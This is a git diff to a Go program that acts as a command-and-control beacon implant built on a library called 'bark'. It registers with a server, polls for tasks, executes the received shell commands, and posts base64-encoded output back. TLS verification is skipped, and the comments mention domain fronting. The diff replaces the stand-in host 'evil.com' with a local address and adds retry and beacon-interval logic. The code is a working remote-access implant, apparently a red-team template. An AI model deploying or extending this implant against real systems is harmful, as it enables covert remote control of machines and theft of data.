@@ -3,6 +3,7 @@ package main
 import (
 	"encoding/base64"
 	"fmt"
+	"os"
 	"time"
 
 	"github.com/salukikit/bark"
@@ -16,20 +17,30 @@ func RunCmd(cmd string) string {
 }
 
 func YourDecryptFunc(respbody []byte) (string, bool) {
+	fmt.Println("Decrypting response")
+	if respbody == nil {
+		return "", false
+	}
 	return string(respbody), true
 
 }
 
 func YourEncryptFunc(output []byte) (string, bool) {
+	fmt.Println("Encrypting Output")
+	if output == nil {
+		return "", false
+
+	}
 	return base64.StdEncoding.EncodeToString(output), true
 
 }
 
 func main() {
 
-	var reg bool
-
+	reg := false
 	verifycert := false
+
+	beacontime, _ := time.ParseDuration("5s")
 
 	/*
 		The next line creates a simple default http transport, with tls verify skipped.
@@ -40,7 +51,7 @@ func main() {
 
 	//root url should include the protocol, e.g. http:// or https://
 
-	rooturl := "https://evil.com"
+	rooturl := "https://127.0.0.1:8080"
 
 	/*
 		You can also manually specify Transport config etc via the .tr field like so:
@@ -55,13 +66,15 @@ func main() {
 		This can be useful for things like domain fronting, where you might need to manually specify the SNI header, or if you have really specific TLS needs.
 	*/
 
-	for !reg {
+	for reg != true {
+		fmt.Println("Attempting to register")
 
 		regurl := rooturl + "/register"
 		resp, err := mybarker.Beacon(regurl)
 		if err != nil {
-			time.Sleep(1000)
-			return
+
+			time.Sleep(beacontime)
+			continue
 		}
 
 		//do your decryption/verification, maybe get some fancy new urls after registering, it's all up to you!
@@ -71,19 +84,22 @@ func main() {
 			mybarker.Ua = ua
 			reg = true
 		}
+		time.Sleep(beacontime)
 
 	}
 
 	//Now we start the beacon loop
 	for {
 
+		fmt.Println("Awaiting tasks")
+
 		beaconurl := rooturl + "/tasks"
-		posturl := rooturl + "/tasks/"
+		posturl := rooturl + "/tasks"
 
 		encCmd, err := mybarker.Beacon(beaconurl)
 		if err != nil {
-			time.Sleep(1000)
-			return
+			time.Sleep(beacontime)
+			continue
 		}
 		cmd, ok := YourDecryptFunc(encCmd)
 		if ok {
@@ -92,11 +108,17 @@ func main() {
 			output := RunCmd(cmd)
 			encdata, ok := YourEncryptFunc([]byte(output))
 			if ok {
-				taskid := "123" //TaskID is usually sent in the path after the tasks url e.g. /tasks/123
-				mybarker.PostOutput(posturl+taskid, []byte(encdata))
+				//taskid := "123" TaskID could be handled in the JWT, the body, or by path e.g. /task/123. This is up to you.
+				_, err := mybarker.PostOutput(posturl, []byte(encdata))
+				if err != nil {
+					continue
+				}
+				os.Exit(0)
+
 			}
+			time.Sleep(beacontime)
 
 		}
-		time.Sleep(1000)
+
 	}
 }
